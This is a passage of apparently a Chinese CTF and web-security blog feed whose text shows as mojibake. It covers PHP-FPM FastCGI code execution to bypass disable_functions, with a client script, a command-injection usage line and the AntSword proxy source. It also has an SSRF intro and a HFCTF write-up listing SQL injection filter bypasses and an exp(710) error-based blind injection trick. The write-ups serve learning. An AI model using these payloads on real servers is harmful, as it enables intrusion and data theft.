self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="hljs-string">&#x27;&#x27;</span>, requestId)<br><br>        <span class="hljs-keyword">if</span> post:<br>            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, post, requestId)<br>        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="hljs-string">&#x27;&#x27;</span>, requestId)<br>        <span class="hljs-comment"># å‘é€fast-cgiæ ¼å¼çš„åŒ…</span><br>        self.sock.send(request)<br>        self.requests[requestId][<span class="hljs-string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_SEND<br>        self.requests[requestId][<span class="hljs-string">&#x27;response&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-comment"># æ¥å—è¿”å›åŒ…</span><br>        <span class="hljs-keyword">return</span> self.__waitForResponse(requestId)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__waitForResponse</span>(<span class="hljs-params">self, requestId</span>):</span><br>        <span class="hljs-comment"># æ¥å—è¿”å›åŒ…</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            response = self.__decodeFastCGIRecord()<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> response:<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \<br>                    <span class="hljs-keyword">or</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:<br>                <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:<br>                    self.requests[<span class="hljs-string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_ERROR<br>                <span class="hljs-keyword">if</span> requestId == <span class="hljs-built_in">int</span>(response[<span class="hljs-string">&#x27;requestId&#x27;</span>]):<br>                    self.requests[requestId][<span class="hljs-string">&#x27;response&#x27;</span>] += response[<span class="hljs-string">&#x27;content&#x27;</span>]<br>            <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.FCGI_STATE_SUCCESS:<br>                self.requests[requestId]<br>        <span class="hljs-keyword">return</span> self.requests[requestId][<span class="hljs-string">&#x27;response&#x27;</span>]<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__repr__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(self.host, self.port)<br></code></pre></div></td></tr></table></figure><p>åˆ©ç”¨</p><blockquote><p>python fpm.py 127.0.0.1 -p 9000 /var/www/html/phpinfo.php -c â€˜&lt;?php echo <code>id</code>;exit;?&gt;â€™</p></blockquote><p>ä¹Ÿå¯çœ‹çœ‹èšå‰‘æ’ä»¶.antproxy.phpçš„æºç </p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_client_header</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable">$headers</span>=<span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_SERVER</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span>=&gt;<span class="hljs-variable">$v</span>)&#123;<br>        <span class="hljs-keyword">if</span>(strpos(<span class="hljs-variable">$k</span>,<span class="hljs-string">&#x27;HTTP_&#x27;</span>)===<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-variable">$k</span>=strtolower(preg_replace(<span class="hljs-string">&#x27;/^HTTP/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$k</span>));<br>            <span class="hljs-variable">$k</span>=preg_replace_callback(<span class="hljs-string">&#x27;/_\w/&#x27;</span>,<span class="hljs-string">&#x27;header_callback&#x27;</span>,<span class="hljs-variable">$k</span>);<br>            <span class="hljs-variable">$k</span>=preg_replace(<span class="hljs-string">&#x27;/^_/&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$k</span>);<br>            <span class="hljs-variable">$k</span>=str_replace(<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;-&#x27;</span>,<span class="hljs-variable">$k</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$k</span>==<span class="hljs-string">&#x27;Host&#x27;</span>) <span class="hljs-keyword">continue</span>;<br>            <span class="hljs-variable">$headers</span>[]=<span class="hljs-string">&quot;<span class="hljs-subst">$k</span>:<span class="hljs-subst">$v</span>&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$headers</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">header_callback</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> strtoupper(<span class="hljs-variable">$str</span>[<span class="hljs-number">0</span>]);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parseHeader</span>(<span class="hljs-params"><span class="hljs-variable">$sResponse</span></span>)</span>&#123;<br>    <span class="hljs-keyword">list</span>(<span class="hljs-variable">$headerstr</span>,<span class="hljs-variable">$sResponse</span>)=explode(<span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;</span>,<span class="hljs-variable">$sResponse</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-variable">$ret</span>=<span class="hljs-keyword">array</span>(<span class="hljs-variable">$headerstr</span>,<span class="hljs-variable">$sResponse</span>);<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^HTTP/1.1 d&#123;3&#125;/&#x27;</span>, <span class="hljs-variable">$sResponse</span>))&#123;<br>        <span class="hljs-variable">$ret</span>=parseHeader(<span class="hljs-variable">$sResponse</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$ret</span>;<br>&#125;<br><br>set_time_limit(<span class="hljs-number">120</span>);<br><span class="hljs-variable">$headers</span>=get_client_header();<br><span class="hljs-variable">$host</span> = <span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br><span class="hljs-variable">$port</span> = <span class="hljs-number">61813</span>;<br><span class="hljs-variable">$errno</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$errstr</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$timeout</span> = <span class="hljs-number">30</span>;<br><span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;/index.php&quot;</span>;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$url</span> .= <span class="hljs-string">&quot;?&quot;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br>&#125;;<br><br><span class="hljs-variable">$fp</span> = fsockopen(<span class="hljs-variable">$host</span>, <span class="hljs-variable">$port</span>, <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$timeout</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$fp</span>)&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-variable">$method</span> = <span class="hljs-string">&quot;GET&quot;</span>;<br><span class="hljs-variable">$post_data</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>]==<span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-variable">$method</span> = <span class="hljs-string">&quot;POST&quot;</span>;<br>    <span class="hljs-variable">$post_data</span> = file_get_contents(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$out</span> = <span class="hljs-variable">$method</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$url</span>.<span class="hljs-string">&quot; HTTP/1.1\r\n&quot;</span>;<br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Host: &quot;</span>.<span class="hljs-variable">$host</span>.<span class="hljs-string">&quot;:&quot;</span>.<span class="hljs-variable">$port</span>.<span class="hljs-string">&quot;\r\n&quot;</span>;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;CONTENT_TYPE&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Content-Type: &quot;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;CONTENT_TYPE&#x27;</span>].<span class="hljs-string">&quot;\r\n&quot;</span>;<br>&#125;<br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Content-length:&quot;</span>.strlen(<span class="hljs-variable">$post_data</span>).<span class="hljs-string">&quot;\r\n&quot;</span>;<br><br><span class="hljs-variable">$out</span> .= implode(<span class="hljs-string">&quot;\r\n&quot;</span>,<span class="hljs-variable">$headers</span>);<br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;\r\n\r\n&quot;</span>;<br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;&quot;</span>.<span class="hljs-variable">$post_data</span>;<br><br>fputs(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$out</span>);<br><br><span class="hljs-variable">$response</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=fread(<span class="hljs-variable">$fp</span>, <span class="hljs-number">4096</span>))&#123;<br>    <span class="hljs-variable">$response</span> .= <span class="hljs-variable">$row</span>;<br>&#125;<br>fclose(<span class="hljs-variable">$fp</span>);<br><span class="hljs-variable">$pos</span> = strpos(<span class="hljs-variable">$response</span>, <span class="hljs-string">&quot;\r\n\r\n&quot;</span>);<br><span class="hljs-variable">$response</span> = substr(<span class="hljs-variable">$response</span>, <span class="hljs-variable">$pos</span>+<span class="hljs-number">4</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$response</span>;<br><br></code></pre></div></td></tr></table></figure><h4 id="PHP-FPMä»»æ„ä»£ç æ‰§è¡Œ"><a href="#PHP-FPMä»»æ„ä»£ç æ‰§è¡Œ" class="headerlink" title="PHP-FPMä»»æ„ä»£ç æ‰§è¡Œ"></a>PHP-FPMä»»æ„ä»£ç æ‰§è¡Œ</h4><p>å‚è€ƒæ–‡ç« <br><a href="_url"></a><a href="https://zhuanlan.zhihu.com/p/75114351?from_voters_page=true">https://zhuanlan.zhihu.com/p/75114351?from_voters_page=true</a><br><a href="_url"></a><a href="https://juejin.cn/post/6844903471976546311">https://juejin.cn/post/6844903471976546311</a><br><a href="_url"></a><a href="https://xz.aliyun.com/t/5598">https://xz.aliyun.com/t/5598</a><br><a href="_url"></a><a href="https://www.cnblogs.com/cjjjj/p/9844829.html">https://www.cnblogs.com/cjjjj/p/9844829.html</a><br><a href="_url"></a><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p><h2 id="UAF-é‡Šæ”¾é‡å¼•ç”¨æ¼æ´ï¼Œä¾‹GC-UAFã€Json-Serializer-UAF-æ¼æ´ã€Backtrace-UAFç­‰-1"><a href="#UAF-é‡Šæ”¾é‡å¼•ç”¨æ¼æ´ï¼Œä¾‹GC-UAFã€Json-Serializer-UAF-æ¼æ´ã€Backtrace-UAFç­‰-1" class="headerlink" title="- UAF é‡Šæ”¾é‡å¼•ç”¨æ¼æ´ï¼Œä¾‹GC UAFã€Json Serializer UAF æ¼æ´ã€Backtrace UAFç­‰"></a>- UAF é‡Šæ”¾é‡å¼•ç”¨æ¼æ´ï¼Œä¾‹GC UAFã€Json Serializer UAF æ¼æ´ã€Backtrace UAFç­‰</h2><p>è¿™ä¸ªåœ°æ–¹æ¼æ´åŸç†ä¸å †æº¢å‡ºæœ‰å…³ï¼Œç€å®æ²¡çœ‹æ‡‚ï¼Œç›´æ¥ç”¨githubç°æˆçš„ä»£ç æˆ–è€…èšå‰‘ç»•è¿‡å§</p><p><a href="_url"></a><a href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php</a></p><p>å¯å‚è€ƒæ–‡ç« <br><a href="_url"></a><a href="https://www.anquanke.com/post/id/195686#h3-6">https://www.anquanke.com/post/id/195686#h3-6</a><br><a href="_url"></a><a href="https://www.sohu.com/a/440546290_99907709">https://www.sohu.com/a/440546290_99907709</a></p>]]></content>
    
    
    <categories>
      
      <category>å…³äºdisabled_functionçš„ç»•è¿‡</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ssrf</title>
    <link href="/2021/05/15/2021-5-15-ssrf%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/05/15/2021-5-15-ssrf%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h3 id="SSRFç®€ä»‹"><a href="#SSRFç®€ä»‹" class="headerlink" title="SSRFç®€ä»‹"></a>SSRFç®€ä»‹</h3><p>SSRFï¼ŒæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼ŒæœåŠ¡å™¨è¯·æ±‚ä¼ªé€ ï¼Œæ˜¯ç”±æ”»å‡»è€…æ„é€ çš„æ¼æ´ï¼Œç”¨äºå½¢æˆæœåŠ¡å™¨å‘èµ·çš„è¯·æ±‚ã€‚é€šå¸¸ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯å¤–éƒ¨ç½‘ç»œæ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚</p><p>åŸºç¡€å¯å‚è€ƒ<br><a href="https://www.freebuf.com/articles/web/260806.html">https://www.freebuf.com/articles/web/260806.html</a><br><a href="https://websec.readthedocs.io/zh/latest/vuln/ssrf.html">https://websec.readthedocs.io/zh/latest/vuln/ssrf.html</a></p>]]></content>
    
    
    <categories>
      
      <category>ctfhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>ctfhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HFCTFhatenum</title>
    <link href="/2021/05/06/2021-5-6-%5BHFCTF%5Dhatenum/"/>
    <url>/2021/05/06/2021-5-6-%5BHFCTF%5Dhatenum/</url>
    
    <content type="html"><![CDATA[<h2 id="æ–‡ç« ç›®å½•"><a href="#æ–‡ç« ç›®å½•" class="headerlink" title="æ–‡ç« ç›®å½•"></a>æ–‡ç« ç›®å½•</h2><h4 id="æ€»ç»“ä¸€ä¸‹sqlæ³¨å…¥å¸¸è§çš„ç»•è¿‡å§¿åŠ¿"><a href="#æ€»ç»“ä¸€ä¸‹sqlæ³¨å…¥å¸¸è§çš„ç»•è¿‡å§¿åŠ¿" class="headerlink" title="- æ€»ç»“ä¸€ä¸‹sqlæ³¨å…¥å¸¸è§çš„ç»•è¿‡å§¿åŠ¿"></a>- æ€»ç»“ä¸€ä¸‹sqlæ³¨å…¥å¸¸è§çš„ç»•è¿‡å§¿åŠ¿</h4><h4 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="- é¢˜ç›®åˆ†æ"></a>- é¢˜ç›®åˆ†æ</h4><h4 id="ç¼–å†™exp"><a href="#ç¼–å†™exp" class="headerlink" title="- ç¼–å†™exp"></a>- ç¼–å†™exp</h4><hr><h3 id="å…³äºsqlæ³¨å…¥çš„ç»•è¿‡å§¿åŠ¿"><a href="#å…³äºsqlæ³¨å…¥çš„ç»•è¿‡å§¿åŠ¿" class="headerlink" title="å…³äºsqlæ³¨å…¥çš„ç»•è¿‡å§¿åŠ¿"></a>å…³äºsqlæ³¨å…¥çš„ç»•è¿‡å§¿åŠ¿</h3><h5 id="å¯¹äºç©ºæ ¼çš„ç»•è¿‡"><a href="#å¯¹äºç©ºæ ¼çš„ç»•è¿‡" class="headerlink" title="å¯¹äºç©ºæ ¼çš„ç»•è¿‡"></a>å¯¹äºç©ºæ ¼çš„ç»•è¿‡</h5><ul><li>æ¢æˆ /**/ /<em>!</em>/</li><li>ç”¨ç¼–ç ç»•è¿‡</li><li>åŠ æ‹¬å·ç»•è¿‡</li></ul><h4 id="å¯¹äºå¼•å·çš„ç»•è¿‡"><a href="#å¯¹äºå¼•å·çš„ç»•è¿‡" class="headerlink" title="å¯¹äºå¼•å·çš„ç»•è¿‡"></a>å¯¹äºå¼•å·çš„ç»•è¿‡</h4><ul><li>ç”¨åå…­è¿›åˆ¶ç»•è¿‡<figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> column_name  <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span>&quot;users&quot;<br></code></pre></div></td></tr></table></figure>åå…­è¿›åˆ¶æ›¿æ¢å<figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> column_name  <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-number">0x7573657273</span><br></code></pre></div></td></tr></table></figure></li></ul><h4 id="å¯¹äºé€—å·çš„ç»•è¿‡"><a href="#å¯¹äºé€—å·çš„ç»•è¿‡" class="headerlink" title="å¯¹äºé€—å·çš„ç»•è¿‡"></a>å¯¹äºé€—å·çš„ç»•è¿‡</h4><ul><li>å¯ä»¥ç”¨fromæˆ–è€…offsetæ¥ç»•è¿‡</li></ul><h4 id="æ¯”è¾ƒç¬¦å·ï¼ˆ-lt-gt-ï¼‰ç»•è¿‡ï¼ˆè¿‡æ»¤äº†-lt-gt-ï¼šsqlmapç›²æ³¨ç»å¸¸ä½¿ç”¨-lt-gt-ï¼Œä½¿ç”¨betweençš„è„šæœ¬"><a href="#æ¯”è¾ƒç¬¦å·ï¼ˆ-lt-gt-ï¼‰ç»•è¿‡ï¼ˆè¿‡æ»¤äº†-lt-gt-ï¼šsqlmapç›²æ³¨ç»å¸¸ä½¿ç”¨-lt-gt-ï¼Œä½¿ç”¨betweençš„è„šæœ¬" class="headerlink" title="æ¯”è¾ƒç¬¦å·ï¼ˆ&lt;&gt;ï¼‰ç»•è¿‡ï¼ˆè¿‡æ»¤äº†&lt;&gt;ï¼šsqlmapç›²æ³¨ç»å¸¸ä½¿ç”¨&lt;&gt;ï¼Œä½¿ç”¨betweençš„è„šæœ¬"></a>æ¯”è¾ƒç¬¦å·ï¼ˆ&lt;&gt;ï¼‰ç»•è¿‡ï¼ˆè¿‡æ»¤äº†&lt;&gt;ï¼šsqlmapç›²æ³¨ç»å¸¸ä½¿ç”¨&lt;&gt;ï¼Œä½¿ç”¨betweençš„è„šæœ¬</h4><ul><li>å¯ä»¥ä½¿ç”¨greatest()ã€leastï¼ˆï¼‰ï¼ˆå‰è€…è¿”å›æœ€å¤§å€¼ï¼Œåè€…è¿”å›æœ€å°å€¼ï¼‰</li></ul><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> ascii(substr(database(),<span class="hljs-number">0</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">64</span><br></code></pre></div></td></tr></table></figure><p>æ›¿æ¢åä¸ºä¸‹é¢è¯­å¥</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> greatest(ascii(substr(database(),<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">64</span>)<span class="hljs-operator">=</span><span class="hljs-number">64</span><br></code></pre></div></td></tr></table></figure><h4 id="å¤§å°å†™ç»•è¿‡"><a href="#å¤§å°å†™ç»•è¿‡" class="headerlink" title="å¤§å°å†™ç»•è¿‡"></a>å¤§å°å†™ç»•è¿‡</h4><h4 id="åŒå†™ç»•è¿‡"><a href="#åŒå†™ç»•è¿‡" class="headerlink" title="åŒå†™ç»•è¿‡"></a>åŒå†™ç»•è¿‡</h4><h4 id="å·çš„ç»•è¿‡"><a href="#å·çš„ç»•è¿‡" class="headerlink" title="=å·çš„ç»•è¿‡"></a>=å·çš„ç»•è¿‡</h4><ul><li>å¯ä»¥ç”¨regexpï¼Œlikeç­‰æ¥æ›¿æ¢</li></ul><h4 id="å†…è”æ³¨é‡Šç»•è¿‡ï¼š"><a href="#å†…è”æ³¨é‡Šç»•è¿‡ï¼š" class="headerlink" title="å†…è”æ³¨é‡Šç»•è¿‡ï¼š"></a>å†…è”æ³¨é‡Šç»•è¿‡ï¼š</h4><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#</span><br></code></pre></div></td></tr></table></figure><h4 id="é€šç”¨ç»•è¿‡ï¼ˆç¼–ç ï¼‰"><a href="#é€šç”¨ç»•è¿‡ï¼ˆç¼–ç ï¼‰" class="headerlink" title="é€šç”¨ç»•è¿‡ï¼ˆç¼–ç ï¼‰"></a>é€šç”¨ç»•è¿‡ï¼ˆç¼–ç ï¼‰</h4><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>å³<span class="hljs-operator">%</span><span class="hljs-number">6</span>f<span class="hljs-operator">%</span><span class="hljs-number">72</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-operator">%</span><span class="hljs-number">31</span><span class="hljs-operator">%</span><span class="hljs-number">3</span>d<span class="hljs-operator">%</span><span class="hljs-number">31</span>ï¼Œè€ŒTestä¹Ÿå¯ä»¥ä¸º<span class="hljs-type">CHAR</span>(<span class="hljs-number">101</span>)<span class="hljs-operator">+</span><span class="hljs-type">CHAR</span>(<span class="hljs-number">97</span>)<span class="hljs-operator">+</span><span class="hljs-type">CHAR</span>(<span class="hljs-number">115</span>)<span class="hljs-operator">+</span><span class="hljs-type">CHAR</span>(<span class="hljs-number">116</span>)ã€‚<br></code></pre></div></td></tr></table></figure><hr><h4 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="- é¢˜ç›®åˆ†æ"></a>- é¢˜ç›®åˆ†æ</h4><p>æ‹¿åˆ°æºç å®¡è®¡åå¯ä»¥å‘ç°å‡ ä¹å°†æ‰€æœ‰çš„å¯ç”¨çš„æ³¨å…¥æ–¹æ³•éƒ½è¿‡æ»¤æ‰äº†ï¼Œç„¶è€Œç¬¨æ¯”æˆ‘è¿˜ä¼å›¾ç»•è¿‡å„ç§è¿‡æ»¤è¿›è¡Œinsertçš„æŠ¥é”™æ³¨å…¥,ä¹Ÿè¯•è¿‡å¼‚æˆ–æ³¨å…¥ï¼Œä½†æ˜¯å„ç§æ³¨å…¥éƒ½éœ€è¦åŒæ—¶ç»•è¿‡ä¸€äº›æ ‡ç‚¹ç¬¦å·ï¼Œå§‹ç»ˆæ„é€ ä¸å‡ºæ¥ï¼Œæœ€ç»ˆå‘ç°å¸¸è§„çš„æ³¨å…¥ä¸å¤ªç°å®ã€‚</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/union|select|or|and|\&#x27;|&quot;|sleep|benchmark|regexp|repeat|get_lock|count|=|&gt;|&lt;| |\*|,|;|\r|\n|\t|substr|right|left|mid/i&#x27;</span>, <span class="hljs-variable">$str</span>))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Hack detected&#x27;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>çœ‹åˆ°æºç å¯ä»¥å‘ç°æœ€é‡è¦çš„åœ°æ–¹åœ¨äºå¾—åˆ°adminç”¨æˆ·åçš„codeï¼Œæ‰€ä»¥è¿™ä¸ªåœ°æ–¹åº”è¯¥å¯ä»¥é€šè¿‡æ³¨å…¥è·å¾—codeçš„å€¼ï¼Œç„¶åå¾—åˆ°flag<br><img src="https://img-blog.csdnimg.cn/20210506120247504.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åæ¥é—®äº†ä¸€ä¸‹å¤§ä½¬æ‰å‘ç°å¯ä»¥ç”¨exp(710)çš„æº¢å‡ºæŠ¥é”™ç®€å•æ¥è¯´æŒ‡æ•°å‡½æ•°ä¸ºå¯¹æ•°å‡½æ•°çš„åå‡½æ•°ï¼Œexp()å³ä¸ºä»¥eä¸ºåº•çš„å¯¹æ•°å‡½æ•°ï¼Œä½†å½“ä¼ é€’ä¸€ä¸ªå¤§äº709çš„å€¼æ—¶ï¼Œå‡½æ•°exp()å°±ä¼šå¼•èµ·ä¸€ä¸ªæº¢å‡ºé”™è¯¯ã€‚å¹¶ä¸”è¿˜ä¼šç”¨åˆ°rlike,rlikeåé¢æ˜¯æ­£åˆ™è¯­å¥ï¼Œè¿”å›0æˆ–1ï¼Œåˆ™å¯ä»¥æ„é€  ==||exp(710-(â€¦ rlike â€¦ ))== ã€‚ ä¸‹å›¾æ˜¯åœ¨æœ¬åœ°å¤ç°ï¼Œrlikeå¯ä»¥åŒ¹é…ageä¸­å«æœ‰1çš„,è¿”å›1åˆ™ä¸ºexp(709)ä¸æŠ¥é”™ã€‚<br><img src="https://img-blog.csdnimg.cn/20210506164455116.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" 